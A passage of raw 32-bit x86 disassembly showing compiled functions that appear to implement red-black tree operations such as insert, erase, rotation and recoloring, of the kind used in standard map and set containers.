   14828:	mov    eax,DWORD PTR [eax+0x4]
   1482b:	and    DWORD PTR [eax+0x14],0x0
   1482f:	mov    eax,DWORD PTR [esi+0x4]
   14832:	push   DWORD PTR [eax+0x4]
   14835:	mov    ecx,edi
   14837:	call   0x12d7c
   1483c:	mov    eax,DWORD PTR [edi+0x4]
   1483f:	cmp    esi,DWORD PTR [eax+0x4]
   14842:	jne    0x1479a
   14848:	mov    eax,DWORD PTR [edi+0x4]
   1484b:	mov    eax,DWORD PTR [eax+0x4]
   1484e:	pop    edi
   1484f:	mov    DWORD PTR [eax+0x14],0x1
   14856:	mov    eax,DWORD PTR [ebp+0x8]
   14859:	pop    esi
   1485a:	mov    DWORD PTR [eax],ebx
   1485c:	pop    ebx
   1485d:	pop    ebp
   1485e:	ret    0x10
   14861:	int3   
   14862:	int3   
   14863:	int3   
   14864:	int3   
   14865:	int3   
   14866:	mov    edi,edi
   14868:	push   ebp
   14869:	mov    ebp,esp
   1486b:	push   ecx
   1486c:	push   ecx
   1486d:	push   ebx
   1486e:	push   esi
   1486f:	mov    DWORD PTR [ebp-0x4],ecx
   14872:	push   edi
   14873:	mov    edi,DWORD PTR [ebp+0xc]
   14876:	lea    ecx,[ebp+0xc]
   14879:	call   0x11552
   1487e:	mov    esi,DWORD PTR [edi]
   14880:	mov    eax,ds:0x7f8c8
   14885:	mov    ebx,edi
   14887:	mov    DWORD PTR [ebp-0x8],esi
   1488a:	cmp    esi,eax
   1488c:	jne    0x148aa
   1488e:	mov    esi,DWORD PTR [edi+0x8]
   14891:	mov    eax,DWORD PTR [ebx+0x4]
   14894:	mov    ecx,DWORD PTR [ebp-0x4]
   14897:	mov    DWORD PTR [esi+0x4],eax
   1489a:	mov    eax,DWORD PTR [ecx+0x4]
   1489d:	cmp    DWORD PTR [eax+0x4],edi
   148a0:	jne    0x1491f
   148a2:	mov    DWORD PTR [eax+0x4],esi
   148a5:	jmp    0x1492d
   148aa:	mov    ecx,DWORD PTR [edi+0x8]
   148ad:	cmp    ecx,eax
   148af:	je     0x14891
   148b1:	push   ecx
   148b2:	call   0x1142c
   148b7:	mov    ebx,eax
   148b9:	mov    esi,DWORD PTR [ebx+0x8]
   148bc:	cmp    ebx,edi
   148be:	je     0x14891
   148c0:	mov    eax,DWORD PTR [ebp-0x8]
   148c3:	mov    DWORD PTR [eax+0x4],ebx
   148c6:	mov    eax,DWORD PTR [edi]
   148c8:	mov    DWORD PTR [ebx],eax
   148ca:	cmp    ebx,DWORD PTR [edi+0x8]
   148cd:	jne    0x148d4
   148cf:	mov    DWORD PTR [esi+0x4],ebx
   148d2:	jmp    0x148eb
   148d4:	mov    eax,DWORD PTR [ebx+0x4]
   148d7:	mov    DWORD PTR [esi+0x4],eax
   148da:	mov    eax,DWORD PTR [ebx+0x4]
   148dd:	mov    DWORD PTR [eax],esi
   148df:	mov    eax,DWORD PTR [edi+0x8]
   148e2:	mov    DWORD PTR [ebx+0x8],eax
   148e5:	mov    eax,DWORD PTR [edi+0x8]
   148e8:	mov    DWORD PTR [eax+0x4],ebx
   148eb:	mov    eax,DWORD PTR [ebp-0x4]
   148ee:	mov    eax,DWORD PTR [eax+0x4]
   148f1:	cmp    DWORD PTR [eax+0x4],edi
   148f4:	jne    0x148fb
   148f6:	mov    DWORD PTR [eax+0x4],ebx
   148f9:	jmp    0x14909
   148fb:	mov    eax,DWORD PTR [edi+0x4]
   148fe:	cmp    DWORD PTR [eax],edi
   14900:	jne    0x14906
   14902:	mov    DWORD PTR [eax],ebx
   14904:	jmp    0x14909
   14906:	mov    DWORD PTR [eax+0x8],ebx
   14909:	mov    eax,DWORD PTR [edi+0x4]
   1490c:	mov    DWORD PTR [ebx+0x4],eax
   1490f:	mov    eax,DWORD PTR [ebx+0x1c]
   14912:	mov    ecx,DWORD PTR [edi+0x1c]
   14915:	mov    DWORD PTR [ebx+0x1c],ecx
   14918:	mov    DWORD PTR [edi+0x1c],eax
   1491b:	mov    ebx,edi
   1491d:	jmp    0x14980
   1491f:	mov    eax,DWORD PTR [edi+0x4]
   14922:	cmp    DWORD PTR [eax],edi
   14924:	jne    0x1492a
   14926:	mov    DWORD PTR [eax],esi
   14928:	jmp    0x1492d
   1492a:	mov    DWORD PTR [eax+0x8],esi
   1492d:	mov    eax,DWORD PTR [ecx+0x4]
   14930:	mov    DWORD PTR [ebp-0x8],eax
   14933:	cmp    DWORD PTR [eax],edi
   14935:	jne    0x14957
   14937:	mov    edx,DWORD PTR [edi+0x8]
   1493a:	cmp    edx,DWORD PTR ds:0x7f8c8
   14940:	jne    0x14949
   14942:	mov    edx,DWORD PTR [edi+0x4]
   14945:	mov    DWORD PTR [eax],edx
   14947:	jmp    0x14957
   14949:	push   esi
   1494a:	call   0x1142c
   1494f:	mov    ecx,DWORD PTR [ebp-0x8]
   14952:	mov    DWORD PTR [ecx],eax
   14954:	mov    ecx,DWORD PTR [ebp-0x4]
   14957:	mov    eax,DWORD PTR [ecx+0x4]
   1495a:	mov    DWORD PTR [ebp-0x8],eax
   1495d:	cmp    DWORD PTR [eax+0x8],edi
   14960:	jne    0x14980
   14962:	mov    ecx,DWORD PTR [edi]
   14964:	cmp    ecx,DWORD PTR ds:0x7f8c8
   1496a:	jne    0x14974
   1496c:	mov    ecx,DWORD PTR [edi+0x4]
   1496f:	mov    DWORD PTR [eax+0x8],ecx
   14972:	jmp    0x14980
   14974:	push   esi
   14975:	call   0x1140a
   1497a:	mov    ecx,DWORD PTR [ebp-0x8]
   1497d:	mov    DWORD PTR [ecx+0x8],eax
   14980:	xor    edi,edi
   14982:	inc    edi
   14983:	cmp    DWORD PTR [ebx+0x1c],edi
   14986:	jne    0x14a9d
   1498c:	jmp    0x14a4b
   14991:	cmp    DWORD PTR [esi+0x1c],edi
   14994:	jne    0x14a9a
   1499a:	mov    eax,DWORD PTR [esi+0x4]
   1499d:	cmp    esi,DWORD PTR [eax]
   1499f:	jne    0x14a16
   149a1:	mov    eax,DWORD PTR [eax+0x8]
   149a4:	cmp    DWORD PTR [eax+0x1c],0x0
   149a8:	jne    0x149c2
   149aa:	mov    DWORD PTR [eax+0x1c],edi
   149ad:	mov    eax,DWORD PTR [esi+0x4]
   149b0:	and    DWORD PTR [eax+0x1c],0x0
   149b4:	push   DWORD PTR [esi+0x4]
   149b7:	call   0x13172
   149bc:	mov    eax,DWORD PTR [esi+0x4]
   149bf:	mov    eax,DWORD PTR [eax+0x8]
   149c2:	mov    ecx,DWORD PTR [eax]
   149c4:	cmp    DWORD PTR [ecx+0x1c],edi
   149c7:	jne    0x149d1
   149c9:	mov    ecx,DWORD PTR [eax+0x8]
   149cc:	cmp    DWORD PTR [ecx+0x1c],edi
   149cf:	je     0x14a44
   149d1:	mov    ecx,DWORD PTR [eax+0x8]
   149d4:	cmp    DWORD PTR [ecx+0x1c],edi
   149d7:	jne    0x149f1
   149d9:	mov    ecx,DWORD PTR [eax]
   149db:	mov    DWORD PTR [ecx+0x1c],edi
   149de:	mov    ecx,DWORD PTR [ebp-0x4]
   149e1:	and    DWORD PTR [eax+0x1c],0x0
   149e5:	push   eax
   149e6:	call   0x131c0
   149eb:	mov    eax,DWORD PTR [esi+0x4]
   149ee:	mov    eax,DWORD PTR [eax+0x8]
   149f1:	mov    ecx,DWORD PTR [esi+0x4]
   149f4:	mov    ecx,DWORD PTR [ecx+0x1c]
   149f7:	mov    DWORD PTR [eax+0x1c],ecx
   149fa:	mov    ecx,DWORD PTR [esi+0x4]
   149fd:	mov    DWORD PTR [ecx+0x1c],edi
   14a00:	mov    eax,DWORD PTR [eax+0x8]
   14a03:	mov    ecx,DWORD PTR [ebp-0x4]
   14a06:	mov    DWORD PTR [eax+0x1c],edi
   14a09:	push   DWORD PTR [esi+0x4]
   14a0c:	call   0x13172
   14a11:	jmp    0x14a9a
   14a16:	mov    eax,DWORD PTR [eax]
   14a18:	cmp    DWORD PTR [eax+0x1c],0x0
   14a1c:	jne    0x14a35
   14a1e:	mov    DWORD PTR [eax+0x1c],edi
   14a21:	mov    eax,DWORD PTR [esi+0x4]
   14a24:	and    DWORD PTR [eax+0x1c],0x0
   14a28:	push   DWORD PTR [esi+0x4]
   14a2b:	call   0x131c0
   14a30:	mov    eax,DWORD PTR [esi+0x4]
   14a33:	mov    eax,DWORD PTR [eax]
   14a35:	mov    ecx,DWORD PTR [eax+0x8]
   14a38:	cmp    DWORD PTR [ecx+0x1c],edi
   14a3b:	jne    0x14a5c
   14a3d:	mov    ecx,DWORD PTR [eax]
   14a3f:	cmp    DWORD PTR [ecx+0x1c],edi
   14a42:	jne    0x14a5c
   14a44:	and    DWORD PTR [eax+0x1c],0x0
   14a48:	mov    esi,DWORD PTR [esi+0x4]
   14a4b:	mov    ecx,DWORD PTR [ebp-0x4]
   14a4e:	mov    eax,DWORD PTR [ecx+0x4]
   14a51:	cmp    esi,DWORD PTR [eax+0x4]
   14a54:	jne    0x14991
   14a5a:	jmp    0x14a9a
   14a5c:	mov    ecx,DWORD PTR [eax]
   14a5e:	cmp    DWORD PTR [ecx+0x1c],edi
   14a61:	jne    0x14a7b
   14a63:	mov    ecx,DWORD PTR [eax+0x8]
   14a66:	mov    DWORD PTR [ecx+0x1c],edi
   14a69:	mov    ecx,DWORD PTR [ebp-0x4]
   14a6c:	and    DWORD PTR [eax+0x1c],0x0
   14a70:	push   eax
   14a71:	call   0x13172
   14a76:	mov    eax,DWORD PTR [esi+0x4]
   14a79:	mov    eax,DWORD PTR [eax]
   14a7b:	mov    ecx,DWORD PTR [esi+0x4]
   14a7e:	mov    ecx,DWORD PTR [ecx+0x1c]
   14a81:	mov    DWORD PTR [eax+0x1c],ecx
   14a84:	mov    ecx,DWORD PTR [esi+0x4]
   14a87:	mov    DWORD PTR [ecx+0x1c],edi
   14a8a:	mov    eax,DWORD PTR [eax]
   14a8c:	mov    ecx,DWORD PTR [ebp-0x4]
   14a8f:	mov    DWORD PTR [eax+0x1c],edi
   14a92:	push   DWORD PTR [esi+0x4]
   14a95:	call   0x131c0
   14a9a:	mov    DWORD PTR [esi+0x1c],edi
   14a9d:	lea    eax,[ebx+0xc]
   14aa0:	push   eax
   14aa1:	call   0x1350c
   14aa6:	push   ebx
   14aa7:	call   0x10a86
   14aac:	mov    eax,DWORD PTR [ebp-0x4]
   14aaf:	dec    DWORD PTR [eax+0xc]
   14ab2:	mov    eax,DWORD PTR [ebp+0x8]
   14ab5:	pop    ecx
   14ab6:	mov    ecx,DWORD PTR [ebp+0xc]
   14ab9:	pop    edi
   14aba:	pop    esi
   14abb:	mov    DWORD PTR [eax],ecx
   14abd:	pop    ebx
   14abe:	leave  
   14abf:	ret    0x8
   14ac2:	int3   
   14ac3:	int3   
   14ac4:	int3   
   14ac5:	int3   
   14ac6:	int3   
   14ac7:	int3   
   14ac8:	mov    edi,edi
   14aca:	push   ebp
   14acb:	mov    ebp,esp
   14acd:	push   ebx
   14ace:	push   esi
   14acf:	push   edi
   14ad0:	mov    edi,DWORD PTR [ebp+0x8]
   14ad3:	mov    ebx,ecx
   14ad5:	mov    esi,edi
   14ad7:	cmp    edi,DWORD PTR ds:0x7f8c8
   14add:	je     0x14b05
   14adf:	push   DWORD PTR [esi+0x8]
   14ae2:	mov    ecx,ebx
   14ae4:	call   0x14ac8
   14ae9:	mov    esi,DWORD PTR [esi]
   14aeb:	lea    eax,[edi+0xc]
   14aee:	push   eax
   14aef:	call   0x1350c
   14af4:	push   edi
   14af5:	call   0x10a86
   14afa:	pop    ecx
   14afb:	mov    edi,esi
   14afd:	cmp    esi,DWORD PTR ds:0x7f8c8
   14b03:	jne    0x14adf
   14b05:	pop    edi
   14b06:	pop    esi
   14b07:	pop    ebx
   14b08:	pop    ebp
   14b09:	ret    0x4
   14b0c:	int3   
   14b0d:	int3   
   14b0e:	int3   
   14b0f:	int3   
   14b10:	int3   
   14b11:	int3   
   14b12:	mov    edi,edi
   14b14:	push   esi
   14b15:	push   edi
   14b16:	push   0x1
   14b18:	xor    edi,edi
   14b1a:	push   edi
   14b1b:	mov    esi,ecx
   14b1d:	call   0x139da
   14b22:	cmp    DWORD PTR ds:0x7f8d0,edi
   14b28:	jne    0x14b3f
   14b2a:	mov    ecx,eax
   14b2c:	mov    DWORD PTR ds:0x7f8d0,ecx
   14b32:	mov    DWORD PTR [ecx],edi
   14b34:	mov    ecx,DWORD PTR ds:0x7f8d0
   14b3a:	xor    eax,eax
   14b3c:	mov    DWORD PTR [ecx+0x8],edi
   14b3f:	inc    DWORD PTR ds:0x7fa30
   14b45:	cmp    eax,edi
   14b47:	je     0x14b50
   14b49:	push   eax
   14b4a:	call   0x10a86
   14b4f:	pop    ecx
   14b50:	push   edi
   14b51:	push   DWORD PTR ds:0x7f8d0
   14b57:	mov    ecx,esi
   14b59:	call   0x139da
   14b5e:	mov    DWORD PTR [esi+0xc],edi
   14b61:	mov    DWORD PTR [esi+0x4],eax
   14b64:	mov    DWORD PTR [eax],eax
   14b66:	mov    esi,DWORD PTR [esi+0x4]
   14b69:	pop    edi
   14b6a:	mov    DWORD PTR [esi+0x8],esi
   14b6d:	pop    esi
   14b6e:	ret    
   14b6f:	int3   
   14b70:	int3   
   14b71:	int3   
   14b72:	int3   
   14b73:	int3   
   14b74:	mov    edi,edi
   14b76:	push   ebp
   14b77:	mov    ebp,esp
   14b79:	push   ebx
   14b7a:	mov    ebx,DWORD PTR [ebp+0x8]
   14b7d:	mov    eax,DWORD PTR [ebx+0x4]
   14b80:	push   esi
   14b81:	push   edi
   14b82:	mov    esi,ecx
   14b84:	mov    edi,DWORD PTR [esi+0x4]
   14b87:	add    eax,0x4
   14b8a:	push   edi
   14b8b:	push   DWORD PTR [eax]
   14b8d:	call   0x13b9c
   14b92:	mov    DWORD PTR [edi+0x4],eax
   14b95:	mov    eax,DWORD PTR [ebx+0xc]
   14b98:	mov    edi,DWORD PTR [esi+0x4]
   14b9b:	mov    DWORD PTR [esi+0xc],eax
   14b9e:	mov    eax,DWORD PTR [edi+0x4]
   14ba1:	cmp    eax,DWORD PTR ds:0x7f8bc
   14ba7:	je     0x14bc1
   14ba9:	push   eax
   14baa:	call   0x1122e
   14baf:	mov    DWORD PTR [edi],eax
   14bb1:	mov    esi,DWORD PTR [esi+0x4]
   14bb4:	push   DWORD PTR [esi+0x4]
   14bb7:	call   0x1120c
   14bbc:	mov    DWORD PTR [esi+0x8],eax
   14bbf:	jmp    0x14bc9
   14bc1:	mov    DWORD PTR [edi],edi
   14bc3:	mov    esi,DWORD PTR [esi+0x4]
   14bc6:	mov    DWORD PTR [esi+0x8],esi
   14bc9:	pop    edi
   14bca:	pop    esi
   14bcb:	pop    ebx
   14bcc:	pop    ebp
   14bcd:	ret    0x4
   14bd0:	int3   
   14bd1:	int3   
   14bd2:	int3   
   14bd3:	int3   
   14bd4:	int3   
   14bd5:	int3   
   14bd6:	mov    edi,edi
   14bd8:	push   ebp
   14bd9:	mov    ebp,esp
   14bdb:	push   edi
   14bdc:	mov    edi,DWORD PTR [ebp+0xc]
   14bdf:	cmp    DWORD PTR [ebp+0x8],edi
   14be2:	je     0x14bf8
   14be4:	push   esi
   14be5:	mov    esi,DWORD PTR [ebp+0x10]
   14be8:	inc    DWORD PTR [esi]
   14bea:	lea    ecx,[ebp+0x8]
   14bed:	call   0x13890
   14bf2:	cmp    DWORD PTR [ebp+0x8],edi
   14bf5:	jne    0x14be8
   14bf7:	pop    esi
   14bf8:	pop    edi
   14bf9:	pop    ebp
   14bfa:	ret    
   14bfb:	int3   
   14bfc:	int3   
   14bfd:	int3   
   14bfe:	int3   
   14bff:	int3   
   14c00:	mov    edi,edi
   14c02:	push   ebp
   14c03:	mov    ebp,esp
   14c05:	push   DWORD PTR [ebp+0xc]
   14c08:	push   DWORD PTR [ebp+0x8]
   14c0b:	call   0x13c96
   14c10:	mov    eax,DWORD PTR [ebp+0x8]
   14c13:	pop    ebp
   14c14:	ret    0x8
   14c17:	int3   
   14c18:	int3   
   14c19:	int3   
   14c1a:	int3   
   14c1b:	int3   
   14c1c:	mov    edi,edi
   14c1e:	push   ebp
   14c1f:	mov    ebp,esp
   14c21:	push   ecx
   14c22:	push   esi
   14c23:	mov    esi,ecx
   14c25:	cmp    DWORD PTR [esi+0xc],0x0
   14c29:	mov    ecx,DWORD PTR [ebp+0xc]
   14c2c:	je     0x14c66
   14c2e:	mov    eax,DWORD PTR [esi+0x4]
   14c31:	cmp    ecx,DWORD PTR [eax]
   14c33:	jne    0x14c66
   14c35:	cmp    DWORD PTR [ebp+0x10],eax
   14c38:	jne    0x14c66
   14c3a:	push   DWORD PTR [eax+0x4]
   14c3d:	mov    ecx,esi
   14c3f:	call   0x138ee
   14c44:	mov    ecx,DWORD PTR ds:0x7f8b8
   14c4a:	mov    eax,DWORD PTR [esi+0x4]
   14c4d:	mov    DWORD PTR [eax+0x4],ecx
   14c50:	mov    eax,DWORD PTR [esi+0x4]
   14c53:	and    DWORD PTR [esi+0xc],0x0
   14c57:	mov    DWORD PTR [eax],eax
   14c59:	mov    eax,DWORD PTR [esi+0x4]
   14c5c:	mov    DWORD PTR [eax+0x8],eax
   14c5f:	mov    eax,DWORD PTR [esi+0x4]
   14c62:	mov    ecx,DWORD PTR [eax]
   14c64:	jmp    0x14c8b
   14c66:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c69:	je     0x14c8b
   14c6b:	push   edi
   14c6c:	mov    edi,ecx
   14c6e:	lea    ecx,[ebp+0xc]
   14c71:	call   0x112d4
   14c76:	push   edi
   14c77:	lea    eax,[ebp-0x4]
   14c7a:	push   eax
   14c7b:	mov    ecx,esi
   14c7d:	call   0x13d88
   14c82:	mov    ecx,DWORD PTR [ebp+0xc]
   14c85:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c88:	jne    0x14c6c
   14c8a:	pop    edi
   14c8b:	mov    eax,DWORD PTR [ebp+0x8]
   14c8e:	mov    DWORD PTR [eax],ecx
   14c90:	pop    esi
   14c91:	leave  
   14c92:	ret    0xc
   14c95:	int3   
   14c96:	int3   
   14c97:	int3   
   14c98:	int3   
   14c99:	int3   
   14c9a:	mov    edi,edi
   14c9c:	push   ebp
   14c9d:	mov    ebp,esp
   14c9f:	push   ecx
   14ca0:	push   ecx
   14ca1:	push   esi
   14ca2:	push   DWORD PTR [ebp+0x8]
   14ca5:	lea    eax,[ebp-0x8]
   14ca8:	push   eax
   14ca9:	mov    esi,ecx
   14cab:	call   0x13fe0
   14cb0:	and    DWORD PTR [ebp+0x8],0x0
   14cb4:	lea    eax,[ebp+0x8]
   14cb7:	push   eax
   14cb8:	push   DWORD PTR [ebp-0x4]
   14cbb:	push   DWORD PTR [ebp-0x8]
   14cbe:	call   0x13a4e
   14cc3:	add    esp,0xc
   14cc6:	push   DWORD PTR [ebp-0x4]
   14cc9:	lea    eax,[ebp-0x4]
   14ccc:	push   DWORD PTR [ebp-0x8]
   14ccf:	mov    ecx,esi
   14cd1:	push   eax
   14cd2:	call   0x14c1c
   14cd7:	mov    eax,DWORD PTR [ebp+0x8]
   14cda:	pop    esi
   14cdb:	leave  
   14cdc:	ret    0x4
   14cdf:	int3   
   14ce0:	int3   
   14ce1:	int3   
   14ce2:	int3   
   14ce3:	int3   
   14ce4:	mov    edi,edi
   14ce6:	push   ebp
   14ce7:	mov    ebp,esp
   14ce9:	push   ecx
   14cea:	push   ebx
   14ceb:	push   esi
   14cec:	push   edi
   14ced:	mov    edi,ecx
   14cef:	mov    eax,DWORD PTR [edi+0x4]
   14cf2:	mov    esi,DWORD PTR [eax+0x4]
   14cf5:	mov    ebx,eax
   14cf7:	mov    eax,ds:0x7f8bc
   14cfc:	mov    dl,0x1
   14cfe:	cmp    esi,eax
   14d00:	je     0x14d1e
   14d02:	mov    ecx,DWORD PTR [ebp+0xc]
   14d05:	mov    ecx,DWORD PTR [ecx]
   14d07:	cmp    ecx,DWORD PTR [esi+0xc]
   14d0a:	mov    ebx,esi
   14d0c:	setb   dl
   14d0f:	test   dl,dl
   14d11:	je     0x14d17
   14d13:	mov    esi,DWORD PTR [esi]
   14d15:	jmp    0x14d1a
   14d17:	mov    esi,DWORD PTR [esi+0x8]
   14d1a:	cmp    esi,eax
   14d1c:	jne    0x14d07
   14d1e:	cmp    BYTE PTR [edi+0x8],0x0
   14d22:	je     0x14d3f
   14d24:	push   DWORD PTR [ebp+0xc]
   14d27:	push   ebx
   14d28:	push   esi
   14d29:	lea    eax,[ebp+0xc]
   14d2c:	push   eax
   14d2d:	mov    ecx,edi
   14d2f:	call   0x14564
   14d34:	mov    ecx,DWORD PTR [eax]
   14d36:	mov    eax,DWORD PTR [ebp+0x8]
   14d39:	mov    BYTE PTR [eax+0x4],0x1
   14d3d:	jmp    0x14d6e
   14d3f:	mov    ecx,ebx
   14d41:	mov    DWORD PTR [ebp-0x4],ecx
   14d44:	test   dl,dl
   14d46:	je     0x14d5a
   14d48:	mov    eax,DWORD PTR [edi+0x4]
   14d4b:	cmp    ebx,DWORD PTR [eax]
   14d4d:	je     0x14d24
   14d4f:	lea    ecx,[ebp-0x4]
   14d52:	call   0x12f08
   14d57:	mov    ecx,DWORD PTR [ebp-0x4]
   14d5a:	mov    edx,DWORD PTR [ecx+0xc]
   14d5d:	mov    eax,DWORD PTR [ebp+0xc]
   14d60:	cmp    edx,DWORD PTR [eax]
   14d62:	jae    0x14d67
   14d64:	push   eax
   14d65:	jmp    0x14d27
   14d67:	mov    eax,DWORD PTR [ebp+0x8]
   14d6a:	mov    BYTE PTR [eax+0x4],0x0
   14d6e:	pop    edi
   14d6f:	pop    esi
   14d70:	mov    DWORD PTR [eax],ecx
   14d72:	pop    ebx
   14d73:	leave  
   14d74:	ret    0x8
   14d77:	int3   
   14d78:	int3   
   14d79:	int3   
   14d7a:	int3   
   14d7b:	int3   
   14d7c:	mov    edi,edi
   14d7e:	push   ebp
   14d7f:	mov    ebp,esp
   14d81:	push   ecx
   14d82:	push   esi
   14d83:	mov    esi,ecx
   14d85:	cmp    DWORD PTR [esi+0xc],0x0
   14d89:	mov    ecx,DWORD PTR [ebp+0xc]
   14d8c:	je     0x14dc6
   14d8e:	mov    eax,DWORD PTR [esi+0x4]
   14d91:	cmp    ecx,DWORD PTR [eax]
   14d93:	jne    0x14dc6
   14d95:	cmp    DWORD PTR [ebp+0x10],eax
   14d98:	jne    0x14dc6
   14d9a:	push   DWORD PTR [eax+0x4]
   14d9d:	mov    ecx,esi
   14d9f:	call   0x1392e
   14da4:	mov    ecx,DWORD PTR ds:0x7f8bc
   14daa:	mov    eax,DWORD PTR [esi+0x4]
   14dad:	mov    DWORD PTR [eax+0x4],ecx
   14db0:	mov    eax,DWORD PTR [esi+0x4]
   14db3:	and    DWORD PTR [esi+0xc],0x0
   14db7:	mov    DWORD PTR [eax],eax
   14db9:	mov    eax,DWORD PTR [esi+0x4]
   14dbc:	mov    DWORD PTR [eax+0x8],eax
   14dbf:	mov    eax,DWORD PTR [esi+0x4]
   14dc2:	mov    ecx,DWORD PTR [eax]
   14dc4:	jmp    0x14deb
   14dc6:	cmp    ecx,DWORD PTR [ebp+0x10]
   14dc9:	je     0x14deb
   14dcb:	push   edi
   14dcc:	mov    edi,ecx
   14dce:	lea    ecx,[ebp+0xc]
   14dd1:	call   0x12f48
   14dd6:	push   edi
   14dd7:	lea    eax,[ebp-0x4]
   14dda:	push   eax
   14ddb:	mov    ecx,esi
   14ddd:	call   0x14278
   14de2:	mov    ecx,DWORD PTR [ebp+0xc]
   14de5:	cmp    ecx,DWORD PTR [ebp+0x10]
   14de8:	jne    0x14dcc
   14dea:	pop    edi
   14deb:	mov    eax,DWORD PTR [ebp+0x8]
   14dee:	mov    DWORD PTR [eax],ecx
   14df0:	pop    esi
   14df1:	leave  
   14df2:	ret    0xc
   14df5:	int3   
   14df6:	int3   
   14df7:	int3   
   14df8:	int3   
   14df9:	int3   
   14dfa:	mov    edi,edi
   14dfc:	push   ebp
   14dfd:	mov    ebp,esp
   14dff:	push   ecx
   14e00:	push   ecx
   14e01:	push   esi
   14e02:	push   DWORD PTR [ebp+0x8]
   14e05:	lea    eax,[ebp-0x8]
   14e08:	push   eax
   14e09:	mov    esi,ecx
   14e0b:	call   0x144d0
   14e10:	and    DWORD PTR [ebp+0x8],0x0
   14e14:	lea    eax,[ebp+0x8]
   14e17:	push   eax
   14e18:	push   DWORD PTR [ebp-0x4]
   14e1b:	push   DWORD PTR [ebp-0x8]
   14e1e:	call   0x13ab4
   14e23:	add    esp,0xc
   14e26:	push   DWORD PTR [ebp-0x4]
   14e29:	lea    eax,[ebp-0x4]
   14e2c:	push   DWORD PTR [ebp-0x8]
   14e2f:	mov    ecx,esi
   14e31:	push   eax
   14e32:	call   0x14d7c
   14e37:	mov    eax,DWORD PTR [ebp+0x8]
   14e3a:	pop    esi
   14e3b:	leave  
   14e3c:	ret    0x4
   14e3f:	int3   
   14e40:	int3   
   14e41:	int3   
   14e42:	int3   
   14e43:	int3   
   14e44:	mov    edi,edi
   14e46:	push   ebp
   14e47:	mov    ebp,esp
   14e49:	push   ecx
   14e4a:	push   ebx
   14e4b:	push   esi
   14e4c:	push   edi
   14e4d:	mov    edi,ecx
   14e4f:	mov    eax,DWORD PTR [edi+0x4]
   14e52:	mov    esi,DWORD PTR [eax+0x4]
   14e55:	mov    ebx,eax
   14e57:	mov    eax,ds:0x7f8b8
   14e5c:	mov    dl,0x1
   14e5e:	cmp    esi,eax
   14e60:	je     0x14e7e
   14e62:	mov    ecx,DWORD PTR [ebp+0xc]
   14e65:	mov    ecx,DWORD PTR [ecx]
   14e67:	cmp    ecx,DWORD PTR [esi+0xc]
   14e6a:	mov    ebx,esi
   14e6c:	setb   dl
   14e6f:	test   dl,dl
   14e71:	je     0x14e77
   14e73:	mov    esi,DWORD PTR [esi]
   14e75:	jmp    0x14e7a
   14e77:	mov    esi,DWORD PTR [esi+0x8]
   14e7a:	cmp    esi,eax
   14e7c:	jne    0x14e67
   14e7e:	cmp    BYTE PTR [edi+0x8],0x0
   14e82:	je     0x14e9f
   14e84:	push   DWORD PTR [ebp+0xc]
   14e87:	push   ebx
   14e88:	push   esi
   14e89:	lea    eax,[ebp+0xc]
   14e8c:	push   eax
   14e8d:	mov    ecx,edi
   14e8f:	call   0x14716
   14e94:	mov    ecx,DWORD PTR [eax]
   14e96:	mov    eax,DWORD PTR [ebp+0x8]
   14e99:	mov    BYTE PTR [eax+0x4],0x1
   14e9d:	jmp    0x14ece
   14e9f:	mov    ecx,ebx
   14ea1:	mov    DWORD PTR [ebp-0x4],ecx
   14ea4:	test   dl,dl
   14ea6:	je     0x14eba
   14ea8:	mov    eax,DWORD PTR [edi+0x4]
   14eab:	cmp    ebx,DWORD PTR [eax]
   14ead:	je     0x14e84
   14eaf:	lea    ecx,[ebp-0x4]
   14eb2:	call   0x11294
   14eb7:	mov    ecx,DWORD PTR [ebp-0x4]
   14eba:	mov    edx,DWORD PTR [ecx+0xc]
   14ebd:	mov    eax,DWORD PTR [ebp+0xc]
   14ec0:	cmp    edx,DWORD PTR [eax]
   14ec2:	jae    0x14ec7
   14ec4:	push   eax
   14ec5:	jmp    0x14e87
   14ec7:	mov    eax,DWORD PTR [ebp+0x8]
   14eca:	mov    BYTE PTR [eax+0x4],0x0
   14ece:	pop    edi
   14ecf:	pop    esi
   14ed0:	mov    DWORD PTR [eax],ecx
   14ed2:	pop    ebx
   14ed3:	leave  
   14ed4:	ret    0x8
   14ed7:	int3   
   14ed8:	int3   
   14ed9:	int3   
   14eda:	int3   
   14edb:	int3   
   14edc:	mov    edi,edi
   14ede:	push   ebp
   14edf:	mov    ebp,esp
   14ee1:	push   ecx
   14ee2:	push   esi
   14ee3:	mov    esi,ecx
   14ee5:	cmp    DWORD PTR [esi+0xc],0x0
   14ee9:	mov    ecx,DWORD PTR [ebp+0xc]
   14eec:	je     0x14f26
   14eee:	mov    eax,DWORD PTR [esi+0x4]
   14ef1:	cmp    ecx,DWORD PTR [eax]
   14ef3:	jne    0x14f26
   14ef5:	cmp    DWORD PTR [ebp+0x10],eax
   14ef8:	jne    0x14f26
   14efa:	push   DWORD PTR [eax+0x4]
   14efd:	mov    ecx,esi
   14eff:	call   0x14ac8
   14f04:	mov    ecx,DWORD PTR ds:0x7f8c8
   14f0a:	mov    eax,DWORD PTR [esi+0x4]
   14f0d:	mov    DWORD PTR [eax+0x4],ecx
   14f10:	mov    eax,DWORD PTR [esi+0x4]
   14f13:	and    DWORD PTR [esi+0xc],0x0
   14f17:	mov    DWORD PTR [eax],eax
   14f19:	mov    eax,DWORD PTR [esi+0x4]
   14f1c:	mov    DWORD PTR [eax+0x8],eax
   14f1f:	mov    eax,DWORD PTR [esi+0x4]
   14f22:	mov    ecx,DWORD PTR [eax]
   14f24:	jmp    0x14f4b
   14f26:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f29:	je     0x14f4b
   14f2b:	push   edi
   14f2c:	mov    edi,ecx
   14f2e:	lea    ecx,[ebp+0xc]
   14f31:	call   0x11552
   14f36:	push   edi
   14f37:	lea    eax,[ebp-0x4]
   14f3a:	push   eax
   14f3b:	mov    ecx,esi
   14f3d:	call   0x14866
   14f42:	mov    ecx,DWORD PTR [ebp+0xc]
   14f45:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f48:	jne    0x14f2c
   14f4a:	pop    edi
   14f4b:	mov    eax,DWORD PTR [ebp+0x8]
   14f4e:	mov    DWORD PTR [eax],ecx
   14f50:	pop    esi
   14f51:	leave  
   14f52:	ret    0xc
   14f55:	int3   
   14f56:	int3   
   14f57:	int3   
   14f58:	int3   
   14f59:	int3   
   14f5a:	mov    edi,edi
   14f5c:	push   ebp
   14f5d:	mov    ebp,esp
   14f5f:	push   ecx
